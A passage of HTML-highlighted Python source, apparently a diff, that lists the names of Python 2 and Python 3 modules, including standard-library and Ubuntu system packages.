<span class="token string">'Tkdnd'</span><span class="token punctuation">,</span> <span class="token string">'cmd'</span><span class="token punctuation">,</span> <span class="token string">'mimetools'</span><span class="token punctuation">,</span> <span class="token string">'sunau'</span><span class="token punctuation">,</span> <span class="token string">'Tkinter'</span><span class="token punctuation">,</span> <span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'mimetypes'</span><span class="token punctuation">,</span> <span class="token string">'sunaudio'</span><span class="token punctuation">,</span> <span class="token string">'UserDict'</span><span class="token punctuation">,</span> <span class="token string">'codecs'</span><span class="token punctuation">,</span> <span class="token string">'mimify'</span><span class="token punctuation">,</span> <span class="token string">'symbol'</span><span class="token punctuation">,</span> <span class="token string">'UserList'</span><span class="token punctuation">,</span> <span class="token string">'codeop'</span><span class="token punctuation">,</span> <span class="token string">'mmap'</span><span class="token punctuation">,</span> <span class="token string">'symtable'</span><span class="token punctuation">,</span> <span class="token string">'UserString'</span><span class="token punctuation">,</span> <span class="token string">'collections'</span><span class="token punctuation">,</span> <span class="token string">'modulefinder'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'_LWPCookieJar'</span><span class="token punctuation">,</span> <span class="token string">'colorsys'</span><span class="token punctuation">,</span> <span class="token string">'multifile'</span><span class="token punctuation">,</span> <span class="token string">'sysconfig'</span><span class="token punctuation">,</span> <span class="token string">'_MozillaCookieJar'</span><span class="token punctuation">,</span> <span class="token string">'commands'</span><span class="token punctuation">,</span> <span class="token string">'multiprocessing'</span><span class="token punctuation">,</span> <span class="token string">'syslog'</span><span class="token punctuation">,</span> <span class="token string">'__builtin__'</span><span class="token punctuation">,</span> <span class="token string">'compileall'</span><span class="token punctuation">,</span> <span class="token string">'mutex'</span><span class="token punctuation">,</span> <span class="token string">'tabnanny'</span><span class="token punctuation">,</span> <span class="token string">'__future__'</span><span class="token punctuation">,</span> <span class="token string">'compiler'</span><span class="token punctuation">,</span> <span class="token string">'netrc'</span><span class="token punctuation">,</span> <span class="token string">'talloc'</span><span class="token punctuation">,</span> <span class="token string">'_abcoll'</span><span class="token punctuation">,</span> <span class="token string">'contextlib'</span><span class="token punctuation">,</span> <span class="token string">'new'</span><span class="token punctuation">,</span> <span class="token string">'tarfile'</span><span class="token punctuation">,</span> <span class="token string">'_ast'</span><span class="token punctuation">,</span> <span class="token string">'cookielib'</span><span class="token punctuation">,</span> <span class="token string">'nis'</span><span class="token punctuation">,</span> <span class="token string">'telnetlib'</span><span class="token punctuation">,</span> <span class="token string">'_bisect'</span><span class="token punctuation">,</span> <span class="token string">'copy'</span><span class="token punctuation">,</span> <span class="token string">'nntplib'</span><span class="token punctuation">,</span> <span class="token string">'tempfile'</span><span class="token punctuation">,</span> <span class="token string">'_bsddb'</span><span class="token punctuation">,</span> <span class="token string">'copy_reg'</span><span class="token punctuation">,</span> <span class="token string">'ntpath'</span><span class="token punctuation">,</span> <span class="token string">'termios'</span><span class="token punctuation">,</span> <span class="token string">'_codecs'</span><span class="token punctuation">,</span> <span class="token string">'crypt'</span><span class="token punctuation">,</span> <span class="token string">'nturl2path'</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'_codecs_cn'</span><span class="token punctuation">,</span> <span class="token string">'csv'</span><span class="token punctuation">,</span> <span class="token string">'numbers'</span><span class="token punctuation">,</span> <span class="token string">'textwrap'</span><span class="token punctuation">,</span> <span class="token string">'_codecs_hk'</span><span class="token punctuation">,</span> <span class="token string">'ctypes'</span><span class="token punctuation">,</span> <span class="token string">'opcode'</span><span class="token punctuation">,</span> <span class="token string">'_codecs_iso2022'</span><span class="token punctuation">,</span> <span class="token string">'curses'</span><span class="token punctuation">,</span> <span class="token string">'operator'</span><span class="token punctuation">,</span> <span class="token string">'thread'</span><span class="token punctuation">,</span> <span class="token string">'_codecs_jp'</span><span class="token punctuation">,</span> <span class="token string">'datetime'</span><span class="token punctuation">,</span> <span class="token string">'optparse'</span><span class="token punctuation">,</span> <span class="token string">'threading'</span><span class="token punctuation">,</span> <span class="token string">'_codecs_kr'</span><span class="token punctuation">,</span> <span class="token string">'dbhash'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'time'</span><span class="token punctuation">,</span> <span class="token string">'_codecs_tw'</span><span class="token punctuation">,</span> <span class="token string">'dbm'</span><span class="token punctuation">,</span> <span class="token string">'os2emxpath'</span><span class="token punctuation">,</span> <span class="token string">'timeit'</span><span class="token punctuation">,</span> <span class="token string">'_collections'</span><span class="token punctuation">,</span> <span class="token string">'decimal'</span><span class="token punctuation">,</span> <span class="token string">'ossaudiodev'</span><span class="token punctuation">,</span> <span class="token string">'tkColorChooser'</span><span class="token punctuation">,</span> <span class="token string">'_csv'</span><span class="token punctuation">,</span> <span class="token string">'difflib'</span><span class="token punctuation">,</span> <span class="token string">'parser'</span><span class="token punctuation">,</span> <span class="token string">'tkCommonDialog'</span><span class="token punctuation">,</span> <span class="token string">'_ctypes'</span><span class="token punctuation">,</span> <span class="token string">'dircache'</span><span class="token punctuation">,</span> <span class="token string">'pdb'</span><span class="token punctuation">,</span> <span class="token string">'tkFileDialog'</span><span class="token punctuation">,</span> <span class="token string">'_ctypes_test'</span><span class="token punctuation">,</span> <span class="token string">'dis'</span><span class="token punctuation">,</span> <span class="token string">'pickle'</span><span class="token punctuation">,</span> <span class="token string">'tkFont'</span><span class="token punctuation">,</span> <span class="token string">'_curses'</span><span class="token punctuation">,</span> <span class="token string">'distutils'</span><span class="token punctuation">,</span> <span class="token string">'pickletools'</span><span class="token punctuation">,</span> <span class="token string">'tkMessageBox'</span><span class="token punctuation">,</span> <span class="token string">'_curses_panel'</span><span class="token punctuation">,</span> <span class="token string">'doctest'</span><span class="token punctuation">,</span> <span class="token string">'pipes'</span><span class="token punctuation">,</span> <span class="token string">'tkSimpleDialog'</span><span class="token punctuation">,</span> <span class="token string">'_elementtree'</span><span class="token punctuation">,</span> <span class="token string">'dumbdbm'</span><span class="token punctuation">,</span> <span class="token string">'pkgutil'</span><span class="token punctuation">,</span> <span class="token string">'toaiff'</span><span class="token punctuation">,</span> <span class="token string">'_functools'</span><span class="token punctuation">,</span> <span class="token string">'dummy_thread'</span><span class="token punctuation">,</span> <span class="token string">'platform'</span><span class="token punctuation">,</span> <span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token string">'_hashlib'</span><span class="token punctuation">,</span> <span class="token string">'dummy_threading'</span><span class="token punctuation">,</span> <span class="token string">'plistlib'</span><span class="token punctuation">,</span> <span class="token string">'tokenize'</span><span class="token punctuation">,</span> <span class="token string">'_heapq'</span><span class="token punctuation">,</span> <span class="token string">'email'</span><span class="token punctuation">,</span> <span class="token string">'popen2'</span><span class="token punctuation">,</span> <span class="token string">'trace'</span><span class="token punctuation">,</span> <span class="token string">'_hotshot'</span><span class="token punctuation">,</span> <span class="token string">'encodings'</span><span class="token punctuation">,</span> <span class="token string">'poplib'</span><span class="token punctuation">,</span> <span class="token string">'traceback'</span><span class="token punctuation">,</span> <span class="token string">'_io'</span><span class="token punctuation">,</span> <span class="token string">'ensurepip'</span><span class="token punctuation">,</span> <span class="token string">'posix'</span><span class="token punctuation">,</span> <span class="token string">'ttk'</span><span class="token punctuation">,</span> <span class="token string">'_json'</span><span class="token punctuation">,</span> <span class="token string">'errno'</span><span class="token punctuation">,</span> <span class="token string">'posixfile'</span><span class="token punctuation">,</span> <span class="token string">'tty'</span><span class="token punctuation">,</span> <span class="token string">'_locale'</span><span class="token punctuation">,</span> <span class="token string">'exceptions'</span><span class="token punctuation">,</span> <span class="token string">'posixpath'</span><span class="token punctuation">,</span> <span class="token string">'turtle'</span><span class="token punctuation">,</span> <span class="token string">'_lsprof'</span><span class="token punctuation">,</span> <span class="token string">'fcntl'</span><span class="token punctuation">,</span> <span class="token string">'pprint'</span><span class="token punctuation">,</span> <span class="token string">'types'</span><span class="token punctuation">,</span> <span class="token string">'_md5'</span><span class="token punctuation">,</span> <span class="token string">'filecmp'</span><span class="token punctuation">,</span> <span class="token string">'profile'</span><span class="token punctuation">,</span> <span class="token string">'unicodedata'</span><span class="token punctuation">,</span> <span class="token string">'_multibytecodec'</span><span class="token punctuation">,</span> <span class="token string">'fileinput'</span><span class="token punctuation">,</span> <span class="token string">'pstats'</span><span class="token punctuation">,</span> <span class="token string">'unittest'</span><span class="token punctuation">,</span> <span class="token string">'_multiprocessing'</span><span class="token punctuation">,</span> <span class="token string">'fnmatch'</span><span class="token punctuation">,</span> <span class="token string">'pty'</span><span class="token punctuation">,</span> <span class="token string">'urllib'</span><span class="token punctuation">,</span> <span class="token string">'_osx_support'</span><span class="token punctuation">,</span> <span class="token string">'formatter'</span><span class="token punctuation">,</span> <span class="token string">'pwd'</span><span class="token punctuation">,</span> <span class="token string">'urllib2'</span><span class="token punctuation">,</span> <span class="token string">'_pyio'</span><span class="token punctuation">,</span> <span class="token string">'fpformat'</span><span class="token punctuation">,</span> <span class="token string">'py_compile'</span><span class="token punctuation">,</span> <span class="token string">'urlparse'</span><span class="token punctuation">,</span> <span class="token string">'_random'</span><span class="token punctuation">,</span> <span class="token string">'fractions'</span><span class="token punctuation">,</span> <span class="token string">'pyclbr'</span><span class="token punctuation">,</span> <span class="token string">'user'</span><span class="token punctuation">,</span> <span class="token string">'_sha'</span><span class="token punctuation">,</span> <span class="token string">'ftplib'</span><span class="token punctuation">,</span> <span class="token string">'pydoc'</span><span class="token punctuation">,</span> <span class="token string">'uu'</span><span class="token punctuation">,</span> <span class="token string">'_sha256'</span><span class="token punctuation">,</span> <span class="token string">'functools'</span><span class="token punctuation">,</span> <span class="token string">'pydoc_data'</span><span class="token punctuation">,</span> <span class="token string">'uuid'</span><span class="token punctuation">,</span> <span class="token string">'_sha512'</span><span class="token punctuation">,</span> <span class="token string">'future_builtins'</span><span class="token punctuation">,</span> <span class="token string">'pyexpat'</span><span class="token punctuation">,</span> <span class="token string">'warnings'</span><span class="token punctuation">,</span> <span class="token string">'_socket'</span><span class="token punctuation">,</span> <span class="token string">'gc'</span><span class="token punctuation">,</span> <span class="token string">'quopri'</span><span class="token punctuation">,</span> <span class="token string">'wave'</span><span class="token punctuation">,</span> <span class="token string">'_sqlite3'</span><span class="token punctuation">,</span> <span class="token string">'genericpath'</span><span class="token punctuation">,</span> <span class="token string">'random'</span><span class="token punctuation">,</span> <span class="token string">'weakref'</span><span class="token punctuation">,</span> <span class="token string">'_sre'</span><span class="token punctuation">,</span> <span class="token string">'getopt'</span><span class="token punctuation">,</span> <span class="token string">'re'</span><span class="token punctuation">,</span> <span class="token string">'webbrowser'</span><span class="token punctuation">,</span> <span class="token string">'_ssl'</span><span class="token punctuation">,</span> <span class="token string">'getpass'</span><span class="token punctuation">,</span> <span class="token string">'readline'</span><span class="token punctuation">,</span> <span class="token string">'whichdb'</span><span class="token punctuation">,</span> <span class="token string">'_strptime'</span><span class="token punctuation">,</span> <span class="token string">'gettext'</span><span class="token punctuation">,</span> <span class="token string">'repr'</span><span class="token punctuation">,</span> <span class="token string">'wsgiref'</span><span class="token punctuation">,</span> <span class="token string">'_struct'</span><span class="token punctuation">,</span> <span class="token string">'glob'</span><span class="token punctuation">,</span> <span class="token string">'resource'</span><span class="token punctuation">,</span> <span class="token string">'xdrlib'</span><span class="token punctuation">,</span> <span class="token string">'_symtable'</span><span class="token punctuation">,</span> <span class="token string">'grp'</span><span class="token punctuation">,</span> <span class="token string">'rexec'</span><span class="token punctuation">,</span> <span class="token string">'xml'</span><span class="token punctuation">,</span> <span class="token string">'_sysconfigdata'</span><span class="token punctuation">,</span> <span class="token string">'gzip'</span><span class="token punctuation">,</span> <span class="token string">'rfc822'</span><span class="token punctuation">,</span> <span class="token string">'xmllib'</span><span class="token punctuation">,</span> <span class="token string">'_sysconfigdata_nd'</span><span class="token punctuation">,</span> <span class="token string">'hashlib'</span><span class="token punctuation">,</span> <span class="token string">'rlcompleter'</span><span class="token punctuation">,</span> <span class="token string">'xmlrpclib'</span><span class="token punctuation">,</span> <span class="token string">'_testcapi'</span><span class="token punctuation">,</span> <span class="token string">'heapq'</span><span class="token punctuation">,</span> <span class="token string">'robotparser'</span><span class="token punctuation">,</span> <span class="token string">'xxsubtype'</span><span class="token punctuation">,</span> <span class="token string">'_threading_local'</span><span class="token punctuation">,</span> <span class="token string">'hmac'</span><span class="token punctuation">,</span> <span class="token string">'runpy'</span><span class="token punctuation">,</span> <span class="token string">'zipfile'</span><span class="token punctuation">,</span> <span class="token string">'_warnings'</span><span class="token punctuation">,</span> <span class="token string">'hotshot'</span><span class="token punctuation">,</span> <span class="token string">'sched'</span><span class="token punctuation">,</span> <span class="token string">'zipimport'</span><span class="token punctuation">,</span> <span class="token string">'_weakref'</span><span class="token punctuation">,</span> <span class="token string">'htmlentitydefs'</span><span class="token punctuation">,</span> <span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'zlib'</span><span class="token punctuation">,</span> <span class="token string">'_weakrefset'</span><span class="token punctuation">,</span> <span class="token string">'htmllib'</span><span class="token punctuation">,</span> <span class="token string">'sets'</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token string">'httplib'</span><span class="token punctuation">,</span> <span class="token string">'sgmllib'</span><span class="token punctuation">,</span> <span class="token string">'aifc'</span><span class="token punctuation">,</span> <span class="token string">'ihooks'</span><span class="token punctuation">,</span> <span class="token string">'sha'</span>
+<span class="token punctuation">]</span>
+
+all_modules_3 <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'AptUrl'</span><span class="token punctuation">,</span> <span class="token string">'hmac'</span><span class="token punctuation">,</span> <span class="token string">'requests_unixsocket'</span><span class="token punctuation">,</span> <span class="token string">'CommandNotFound'</span><span class="token punctuation">,</span> <span class="token string">'apport'</span><span class="token punctuation">,</span> <span class="token string">'hpmudext'</span><span class="token punctuation">,</span> <span class="token string">'resource'</span><span class="token punctuation">,</span> <span class="token string">'Crypto'</span><span class="token punctuation">,</span> <span class="token string">'apport_python_hook'</span><span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token string">'rlcompleter'</span><span class="token punctuation">,</span> <span class="token string">'DistUpgrade'</span><span class="token punctuation">,</span> <span class="token string">'apt'</span><span class="token punctuation">,</span> <span class="token string">'http'</span><span class="token punctuation">,</span> <span class="token string">'runpy'</span><span class="token punctuation">,</span> <span class="token string">'HweSupportStatus'</span><span class="token punctuation">,</span> <span class="token string">'apt_inst'</span><span class="token punctuation">,</span> <span class="token string">'httplib2'</span><span class="token punctuation">,</span> <span class="token string">'scanext'</span><span class="token punctuation">,</span> <span class="token string">'LanguageSelector'</span><span class="token punctuation">,</span> <span class="token string">'apt_pkg'</span><span class="token punctuation">,</span> <span class="token string">'idna'</span><span class="token punctuation">,</span> <span class="token string">'sched'</span><span class="token punctuation">,</span> <span class="token string">'NvidiaDetector'</span><span class="token punctuation">,</span> <span class="token string">'aptdaemon'</span><span class="token punctuation">,</span> <span class="token string">'imaplib'</span><span class="token punctuation">,</span> <span class="token string">'secrets'</span><span class="token punctuation">,</span> <span class="token string">'PIL'</span><span class="token punctuation">,</span> <span class="token string">'aptsources'</span><span class="token punctuation">,</span> <span class="token string">'imghdr'</span><span class="token punctuation">,</span> <span class="token string">'secretstorage'</span><span class="token punctuation">,</span> <span class="token string">'Quirks'</span><span class="token punctuation">,</span> <span class="token string">'argparse'</span><span class="token punctuation">,</span> <span class="token string">'imp'</span><span class="token punctuation">,</span> <span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'UbuntuDrivers'</span><span class="token punctuation">,</span> <span class="token string">'array'</span><span class="token punctuation">,</span> <span class="token string">'importlib'</span><span class="token punctuation">,</span> <span class="token string">'selectors'</span><span class="token punctuation">,</span> <span class="token string">'UbuntuSystemService'</span><span class="token punctuation">,</span> <span class="token string">'asn1crypto'</span><span class="token punctuation">,</span> <span class="token string">'inspect'</span><span class="token punctuation">,</span> <span class="token string">'shelve'</span><span class="token punctuation">,</span> <span class="token string">'UpdateManager'</span><span class="token punctuation">,</span> <span class="token string">'ast'</span><span class="token punctuation">,</span> <span class="token string">'io'</span><span class="token punctuation">,</span> <span class="token string">'shlex'</span><span class="token punctuation">,</span> <span class="token string">'__future__'</span><span class="token punctuation">,</span> <span class="token string">'asynchat'</span><span class="token punctuation">,</span> <span class="token string">'ipaddress'</span><span class="token punctuation">,</span> <span class="token string">'shutil'</span><span class="token punctuation">,</span> <span class="token string">'_ast'</span><span class="token punctuation">,</span> <span class="token string">'asyncio'</span><span class="token punctuation">,</span> <span class="token string">'itertools'</span><span class="token punctuation">,</span> <span class="token string">'signal'</span><span class="token punctuation">,</span> <span class="token string">'_asyncio'</span><span class="token punctuation">,</span> <span class="token string">'asyncore'</span><span class="token punctuation">,</span> <span class="token string">'janitor'</span><span class="token punctuation">,</span> <span class="token string">'simplejson'</span><span class="token punctuation">,</span> <span class="token string">'_bisect'</span><span class="token punctuation">,</span> <span class="token string">'atexit'</span><span class="token punctuation">,</span> <span class="token string">'json'</span><span class="token punctuation">,</span> <span class="token string">'site'</span><span class="token punctuation">,</span> <span class="token string">'_blake2'</span><span class="token punctuation">,</span> <span class="token string">'audioop'</span><span class="token punctuation">,</span> <span class="token string">'keyring'</span><span class="token punctuation">,</span> <span class="token string">'sitecustomize'</span><span class="token punctuation">,</span> <span class="token string">'_bootlocale'</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">,</span> <span class="token string">'keyword'</span><span class="token punctuation">,</span> <span class="token string">'six'</span><span class="token punctuation">,</span> <span class="token string">'_bz2'</span><span class="token punctuation">,</span> <span class="token string">'bdb'</span><span class="token punctuation">,</span> <span class="token string">'language_support_pkgs'</span><span class="token punctuation">,</span> <span class="token string">'smtpd'</span><span class="token punctuation">,</span> <span class="token string">'_cffi_backend'</span><span class="token punctuation">,</span> <span class="token string">'binascii'</span><span class="token punctuation">,</span> <span class="token string">'launchpadlib'</span><span class="token punctuation">,</span> <span class="token string">'smtplib'</span><span class="token punctuation">,</span> <span class="token string">'_codecs'</span><span class="token punctuation">,</span> <span class="token string">'binhex'</span><span class="token punctuation">,</span> <span class="token string">'linecache'</span><span class="token punctuation">,</span> <span class="token string">'sndhdr'</span><span class="token punctuation">,</span> <span class="token string">'_codecs_cn'</span><span class="token punctuation">,</span> <span class="token string">'bisect'</span><span class="token punctuation">,</span> <span class="token string">'locale'</span><span class="token punctuation">,</span> <span class="token string">'socket'</span><span class="token punctuation">,</span> <span class="token string">'_codecs_hk'</span><span class="token punctuation">,</span> <span class="token string">'brlapi'</span><span class="token punctuation">,</span> <span class="token string">'logging'</span><span class="token punctuation">,</span> <span class="token string">'socketserver'</span><span class="token punctuation">,</span> <span class="token string">'_codecs_iso2022'</span><span class="token punctuation">,</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'louis'</span><span class="token punctuation">,</span> <span class="token string">'softwareproperties'</span><span class="token punctuation">,</span> <span class="token string">'_codecs_jp'</span><span class="token punctuation">,</span> <span class="token string">'bz2'</span><span class="token punctuation">,</span> <span class="token string">'lsb_release'</span><span class="token punctuation">,</span> <span class="token string">'speechd'</span><span class="token punctuation">,</span> <span class="token string">'_codecs_kr'</span><span class="token punctuation">,</span> <span class="token string">'cProfile'</span><span class="token punctuation">,</span> <span class="token string">'lzma'</span><span class="token punctuation">,</span> <span class="token string">'speechd_config'</span><span class="token punctuation">,</span> <span class="token string">'_codecs_tw'</span><span class="token punctuation">,</span> <span class="token string">'cairo'</span><span class="token punctuation">,</span> <span class="token string">'macaroonbakery'</span><span class="token punctuation">,</span> <span class="token string">'spwd'</span><span class="token punctuation">,</span> <span class="token string">'_collections'</span><span class="token punctuation">,</span> <span class="token string">'calendar'</span><span class="token punctuation">,</span> <span class="token string">'macpath'</span><span class="token punctuation">,</span> <span class="token string">'sqlite3'</span><span class="token punctuation">,</span> <span class="token string">'_collections_abc'</span><span class="token punctuation">,</span> <span class="token string">'certifi'</span><span class="token punctuation">,</span> <span class="token string">'macurl2path'</span><span class="token punctuation">,</span> <span class="token string">'sre_compile'</span><span class="token punctuation">,</span> <span class="token string">'_compat_pickle'</span><span class="token punctuation">,</span> <span class="token string">'cgi'</span><span class="token punctuation">,</span> <span class="token string">'mailbox'</span><span class="token punctuation">,</span> <span class="token string">'sre_constants'</span><span class="token punctuation">,</span> <span class="token string">'_compression'</span><span class="token punctuation">,</span> <span class="token string">'cgitb'</span><span class="token punctuation">,</span> <span class="token string">'mailcap'</span><span class="token punctuation">,</span> <span class="token string">'sre_parse'</span><span class="token punctuation">,</span> <span class="token string">'_crypt'</span><span class="token punctuation">,</span> <span class="token string">'chardet'</span><span class="token punctuation">,</span> <span class="token string">'mako'</span><span class="token punctuation">,</span> <span class="token string">'ssl'</span><span class="token punctuation">,</span> <span class="token string">'_csv'</span><span class="token punctuation">,</span> <span class="token string">'chunk'</span><span class="token punctuation">,</span> <span class="token string">'markupsafe'</span><span class="token punctuation">,</span> <span class="token string">'stat'</span><span class="token punctuation">,</span> <span class="token string">'_ctypes'</span><span class="token punctuation">,</span> <span class="token string">'cmath'</span><span class="token punctuation">,</span> <span class="token string">'marshal'</span><span class="token punctuation">,</span> <span class="token string">'statistics'</span><span class="token punctuation">,</span> <span class="token string">'_ctypes_test'</span><span class="token punctuation">,</span> <span class="token string">'cmd'</span><span class="token punctuation">,</span> <span class="token string">'math'</span><span class="token punctuation">,</span> <span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token string">'_curses'</span><span class="token punctuation">,</span> <span class="token string">'code'</span><span class="token punctuation">,</span> <span class="token string">'mimetypes'</span><span class="token punctuation">,</span> <span class="token string">'stringprep'</span><span class="token punctuation">,</span> <span class="token string">'_curses_panel'</span><span class="token punctuation">,</span> <span class="token string">'codecs'</span><span class="token punctuation">,</span> <span class="token string">'mmap'</span><span class="token punctuation">,</span> <span class="token string">'struct'</span><span class="token punctuation">,</span> <span class="token string">'_datetime'</span><span class="token punctuation">,</span> <span class="token string">'codeop'</span><span class="token punctuation">,</span> <span class="token string">'modual_test'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span> <span class="token string">'_dbm'</span><span class="token punctuation">,</span> <span class="token string">'collections'</span><span class="token punctuation">,</span> <span class="token string">'modulefinder'</span><span class="token punctuation">,</span> <span class="token string">'sunau'</span><span class="token punctuation">,</span> <span class="token string">'_dbus_bindings'</span><span class="token punctuation">,</span> <span class="token string">'colorsys'</span><span class="token punctuation">,</span> <span class="token string">'multiprocessing'</span><span class="token punctuation">,</span> <span class="token string">'symbol'</span><span class="token punctuation">,</span> <span class="token string">'_dbus_glib_bindings'</span><span class="token punctuation">,</span> <span class="token string">'compileall'</span><span class="token punctuation">,</span> <span class="token string">'nacl'</span><span class="token punctuation">,</span> <span class="token string">'symtable'</span><span class="token punctuation">,</span> <span class="token string">'_decimal'</span><span class="token punctuation">,</span> <span class="token string">'concurrent'</span><span class="token punctuation">,</span> <span class="token string">'netrc'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'_dummy_thread'</span><span class="token punctuation">,</span> <span class="token string">'configparser'</span><span class="token punctuation">,</span> <span class="token string">'nis'</span><span class="token punctuation">,</span> <span class="token string">'sysconfig'</span><span class="token punctuation">,</span> <span class="token string">'_elementtree'</span><span class="token punctuation">,</span> <span class="token string">'contextlib'</span><span class="token punctuation">,</span> <span class="token string">'nntplib'</span><span class="token punctuation">,</span> <span class="token string">'syslog'</span><span class="token punctuation">,</span> <span class="token string">'_functools'</span><span class="token punctuation">,</span> <span class="token string">'copy'</span><span class="token punctuation">,</span> <span class="token string">'ntpath'</span><span class="token punctuation">,</span> <span class="token string">'systemd'</span><span class="token punctuation">,</span> <span class="token string">'_gdbm'</span><span class="token punctuation">,</span> <span class="token string">'copyreg'</span><span class="token punctuation">,</span> <span class="token string">'nturl2path'</span><span class="token punctuation">,</span> <span class="token string">'tabnanny'</span><span class="token punctuation">,</span> <span class="token string">'_hashlib'</span><span class="token punctuation">,</span> <span class="token string">'crypt'</span><span class="token punctuation">,</span> <span class="token string">'numbers'</span><span class="token punctuation">,</span> <span class="token string">'tarfile'</span><span class="token punctuation">,</span> <span class="token string">'_heapq'</span><span class="token punctuation">,</span> <span class="token string">'cryptography'</span><span class="token punctuation">,</span> <span class="token string">'oauth'</span><span class="token punctuation">,</span> <span class="token string">'telnetlib'</span><span class="token punctuation">,</span> <span class="token string">'_imp'</span><span class="token punctuation">,</span> <span class="token string">'csv'</span><span class="token punctuation">,</span> <span class="token string">'olefile'</span><span class="token punctuation">,</span> <span class="token string">'tempfile'</span><span class="token punctuation">,</span> <span class="token string">'_io'</span><span class="token punctuation">,</span> <span class="token string">'ctypes'</span><span class="token punctuation">,</span> <span class="token string">'opcode'</span><span class="token punctuation">,</span> <span class="token string">'termios'</span><span class="token punctuation">,</span> <span class="token string">'_json'</span><span class="token punctuation">,</span> <span class="token string">'cups'</span><span class="token punctuation">,</span> <span class="token string">'operator'</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'_locale'</span><span class="token punctuation">,</span> <span class="token string">'cupsext'</span><span class="token punctuation">,</span> <span class="token string">'optparse'</span><span class="token punctuation">,</span> <span class="token string">'textwrap'</span><span class="token punctuation">,</span> <span class="token string">'_lsprof'</span><span class="token punctuation">,</span> <span class="token string">'cupshelpers'</span><span class="token punctuation">,</span> <span class="token string">'orca'</span><span class="token punctuation">,</span> <span class="token string">'_lzma'</span><span class="token punctuation">,</span> <span class="token string">'curses'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'threading'</span><span class="token punctuation">,</span> <span class="token string">'_markupbase'</span><span class="token punctuation">,</span> <span class="token string">'datetime'</span><span class="token punctuation">,</span> <span class="token string">'ossaudiodev'</span><span class="token punctuation">,</span> <span class="token string">'time'</span><span class="token punctuation">,</span> <span class="token string">'_md5'</span><span class="token punctuation">,</span> <span class="token string">'dbm'</span><span class="token punctuation">,</span> <span class="token string">'parser'</span><span class="token punctuation">,</span> <span class="token string">'timeit'</span><span class="token punctuation">,</span> <span class="token string">'_multibytecodec'</span><span class="token punctuation">,</span> <span class="token string">'dbus'</span><span class="token punctuation">,</span> <span class="token string">'pathlib'</span><span class="token punctuation">,</span> <span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token string">'_multiprocessing'</span><span class="token punctuation">,</span> <span class="token string">'deb822'</span><span class="token punctuation">,</span> <span class="token string">'pcardext'</span><span class="token punctuation">,</span> <span class="token string">'tokenize'</span><span class="token punctuation">,</span> <span class="token string">'_opcode'</span><span class="token punctuation">,</span> <span class="token string">'debconf'</span><span class="token punctuation">,</span> <span class="token string">'pdb'</span><span class="token punctuation">,</span> <span class="token string">'trace'</span><span class="token punctuation">,</span> <span class="token string">'_operator'</span><span class="token punctuation">,</span> <span class="token string">'debian'</span><span class="token punctuation">,</span> <span class="token string">'pexpect'</span><span class="token punctuation">,</span> <span class="token string">'traceback'</span><span class="token punctuation">,</span> <span class="token string">'_osx_support'</span><span class="token punctuation">,</span> <span class="token string">'debian_bundle'</span><span class="token punctuation">,</span> <span class="token string">'pickle'</span><span class="token punctuation">,</span> <span class="token string">'tracemalloc'</span><span class="token punctuation">,</span> <span class="token string">'_pickle'</span><span class="token punctuation">,</span> <span class="token string">'decimal'</span><span class="token punctuation">,</span> <span class="token string">'pickletools'</span><span class="token punctuation">,</span> <span class="token string">'tty'</span><span class="token punctuation">,</span> <span class="token string">'_posixsubprocess'</span><span class="token punctuation">,</span> <span class="token string">'defer'</span><span class="token punctuation">,</span> <span class="token string">'pipes'</span><span class="token punctuation">,</span> <span class="token string">'turtle'</span><span class="token punctuation">,</span> <span class="token string">'_pydecimal'</span><span class="token punctuation">,</span> <span class="token string">'difflib'</span><span class="token punctuation">,</span> <span class="token string">'pkg_resources'</span><span class="token punctuation">,</span> <span class="token string">'types'</span><span class="token punctuation">,</span> <span class="token string">'_pyio'</span><span class="token punctuation">,</span> <span class="token string">'dis'</span><span class="token punctuation">,</span> <span class="token string">'pkgutil'</span><span class="token punctuation">,</span> <span class="token string">'typing'</span><span class="token punctuation">,</span> <span class="token string">'_random'</span><span class="token punctuation">,</span> <span class="token string">'distro_info'</span><span class="token punctuation">,</span> <span class="token string">'platform'</span><span class="token punctuation">,</span> <span class="token string">'ufw'</span><span class="token punctuation">,</span> <span class="token string">'_sha1'</span><span class="token punctuation">,</span> <span class="token string">'distro_info_test'</span><span class="token punctuation">,</span> <span class="token string">'plistlib'</span><span class="token punctuation">,</span> <span class="token string">'unicodedata'</span><span class="token punctuation">,</span> <span class="token string">'_sha256'</span><span class="token punctuation">,</span> <span class="token string">'distutils'</span><span class="token punctuation">,</span> <span class="token string">'poplib'</span><span class="token punctuation">,</span> <span class="token string">'unittest'</span><span class="token punctuation">,</span> <span class="token string">'_sha3'</span><span class="token punctuation">,</span> <span class="token string">'doctest'</span><span class="token punctuation">,</span> <span class="token string">'posix'</span><span class="token punctuation">,</span> <span class="token string">'urllib'</span><span class="token punctuation">,</span> <span class="token string">'_sha512'</span><span class="token punctuation">,</span> <span class="token string">'dummy_threading'</span><span class="token punctuation">,</span> <span class="token string">'posixpath'</span><span class="token punctuation">,</span> <span class="token string">'urllib3'</span><span class="token punctuation">,</span> <span class="token string">'_signal'</span><span class="token punctuation">,</span> <span class="token string">'email'</span><span class="token punctuation">,</span> <span class="token string">'pprint'</span><span class="token punctuation">,</span> <span class="token string">'usbcreator'</span><span class="token punctuation">,</span> <span class="token string">'_sitebuiltins'</span><span class="token punctuation">,</span> <span 